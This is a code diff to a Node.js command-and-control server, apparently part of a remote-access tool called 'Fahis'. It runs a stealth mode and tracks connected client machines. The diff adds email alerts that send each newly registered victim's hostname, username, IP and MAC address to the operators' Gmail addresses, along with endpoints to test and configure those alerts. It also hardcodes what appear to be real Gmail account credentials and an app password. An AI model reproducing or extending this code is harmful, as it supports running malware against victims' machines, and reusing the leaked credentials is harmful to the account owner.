@@ -11,6 +11,7 @@ const { v4: uuidv4 } = require('uuid');
 const moment = require('moment');
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs');
+const nodemailer = require('nodemailer');
 
 const app = express();
 const server = http.createServer(app);
@@ -90,7 +91,16 @@ const defaultSettings = {
   encryptionEnabled: true,
   stealthMode: true,
   logFile: './logs/c2.log',
-  backupInterval: 24
+  backupInterval: 24,
+  emailEnabled: false,
+  emailHost: 'smtp.gmail.com',
+  emailPort: 587,
+  emailSecure: false,
+  emailUser: 'fahis00786@gmail.com',
+  emailPass: 'xabadhtihzjnitxx',
+  emailFrom: 'fahis00786@gmail.com',
+  emailTo: ['zararanwar1234321@gmail.com','qaziwaseem4zetabytes@gmail.com'],
+  emailSubject: 'Fahis Connection Alert'
 };
 
 function getAllSettings() {
@@ -141,6 +151,77 @@ function ensureDefaultSettings() {
     if (!existing.has(k)) missing[k] = v;
   });
   if (Object.keys(missing).length > 0) setSettings(missing);
+}
+
+// Email functionality
+let emailTransporter = null;
+
+function createEmailTransporter() {
+  const settings = getAllSettings();
+  if (!settings.emailEnabled || !settings.emailUser || !settings.emailPass) {
+    return null;
+  }
+
+  return nodemailer.createTransporter({
+    host: settings.emailHost,
+    port: settings.emailPort,
+    secure: settings.emailSecure,
+    auth: {
+      user: settings.emailUser,
+      pass: settings.emailPass
+    }
+  });
+}
+
+async function sendConnectionAlert(clientInfo) {
+  const settings = getAllSettings();
+  if (!settings.emailEnabled || !settings.emailTo || settings.emailTo.length === 0) {
+    return;
+  }
+
+  if (!emailTransporter) {
+    emailTransporter = createEmailTransporter();
+    if (!emailTransporter) {
+      console.log('[EMAIL] Email not configured properly');
+      return;
+    }
+  }
+
+  const emailContent = `
+    <h2>🚨 Fahis Connection Alert</h2>
+    <p>A new client has connected to your C2 server.</p>
+    
+    <h3>Client Details:</h3>
+    <ul>
+      <li><strong>Hostname:</strong> ${clientInfo.hostname || 'Unknown'}</li>
+      <li><strong>Username:</strong> ${clientInfo.username || 'Unknown'}</li>
+      <li><strong>IP Address:</strong> ${clientInfo.ip || 'Unknown'}</li>
+      <li><strong>MAC Address:</strong> ${clientInfo.macAddress || 'Unknown'}</li>
+      <li><strong>Connected At:</strong> ${clientInfo.connectedAt ? new Date(clientInfo.connectedAt).toLocaleString() : 'Unknown'}</li>
+    </ul>
+    
+    <h3>Server Information:</h3>
+    <ul>
+      <li><strong>Server Time:</strong> ${new Date().toLocaleString()}</li>
+      <li><strong>Total Active Clients:</strong> ${clients.size}</li>
+    </ul>
+    
+    <hr>
+  `;
+
+  const mailOptions = {
+    from: settings.emailFrom || settings.emailUser,
+    to: settings.emailTo.join(', '),
+    subject: settings.emailSubject,
+    html: emailContent
+  };
+
+  try {
+    const info = await emailTransporter.sendMail(mailOptions);
+    console.log(`[EMAIL] Connection alert sent successfully: ${info.messageId}`);
+  } catch (error) {
+    console.error('[EMAIL] Failed to send connection alert:', error);
+  }
 }
 
 // Initialize DB before using
@@ -258,6 +339,11 @@ function createTcpServer() {
         clientSessions.set(clientId, []);
         
         console.log(`[TCP] Client registered: ${clientInfo.hostname} (${clientInfo.username})`);
+        
+        // Send email notification
+        sendConnectionAlert(clientInfo).catch(err => {
+          console.error('[EMAIL] Failed to send connection alert:', err);
+        });
         
         // Notify GUI clients
         io.emit('clientConnected', {
@@ -798,6 +884,98 @@ app.get('/api/downloads/:filename', (req, res) => {
     res.download(filePath);
   } else {
     res.status(404).json({ error: 'File not found' });
+  }
+});
+
+// Email configuration endpoints
+app.get('/api/email/test', async (req, res) => {
+  try {
+    const settings = getAllSettings();
+    if (!settings.emailEnabled) {
+      return res.status(400).json({ error: 'Email notifications are disabled' });
+    }
+
+    // Reset transporter to use current settings
+    emailTransporter = createEmailTransporter();
+    if (!emailTransporter) {
+      return res.status(400).json({ error: 'Email configuration is invalid' });
+    }
+
+    const testEmailContent = `
+      <h2>✅ Fahis Email Test</h2>
+      <p>This is a test email to verify your C2 server email configuration.</p>
+      <p><strong>Test Time:</strong> ${new Date().toLocaleString()}</p>
+      <p><strong>Server Status:</strong> Running</p>
+      <hr>
+      <p><em>If you received this email, your email configuration is working correctly!</em></p>
+    `;
+
+    const mailOptions = {
+      from: settings.emailFrom || settings.emailUser,
+      to: settings.emailTo.join(', '),
+      subject: 'C2 Server - Email Test',
+      html: testEmailContent
+    };
+
+    const info = await emailTransporter.sendMail(mailOptions);
+    res.json({ 
+      success: true, 
+      message: 'Test email sent successfully',
+      messageId: info.messageId 
+    });
+  } catch (error) {
+    console.error('[EMAIL] Test email failed:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Failed to send test email: ' + error.message 
+    });
+  }
+});
+
+app.post('/api/email/settings', async (req, res) => {
+  try {
+    const body = req.body || {};
+    const emailSettings = {
+      emailEnabled: Boolean(body.emailEnabled),
+      emailHost: body.emailHost || 'smtp.gmail.com',
+      emailPort: Number(body.emailPort) || 587,
+      emailSecure: Boolean(body.emailSecure),
+      emailUser: body.emailUser || '',
+      emailPass: body.emailPass || '',
+      emailFrom: body.emailFrom || body.emailUser || '',
+      emailTo: Array.isArray(body.emailTo) ? body.emailTo : [],
+      emailSubject: body.emailSubject || 'C2 Client Connection Alert'
+    };
+
+    // Validate required fields if email is enabled
+    if (emailSettings.emailEnabled) {
+      if (!emailSettings.emailUser || !emailSettings.emailPass) {
+        return res.status(400).json({ 
+          error: 'Email user and password are required when email is enabled' 
+        });
+      }
+      if (!emailSettings.emailTo || emailSettings.emailTo.length === 0) {
+        return res.status(400).json({ 
+          error: 'At least one recipient email address is required' 
+        });
+      }
+    }
+
+    setSettings(emailSettings);
+    
+    // Reset transporter with new settings
+    emailTransporter = null;
+    if (emailSettings.emailEnabled) {
+      emailTransporter = createEmailTransporter();
+    }
+
+    res.json({ success: true, message: 'Email settings updated successfully' });
+  } catch (error) {
+    console.error('[EMAIL] Failed to update email settings:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Failed to update email settings: ' + error.message 
+    });
   }
 });
 
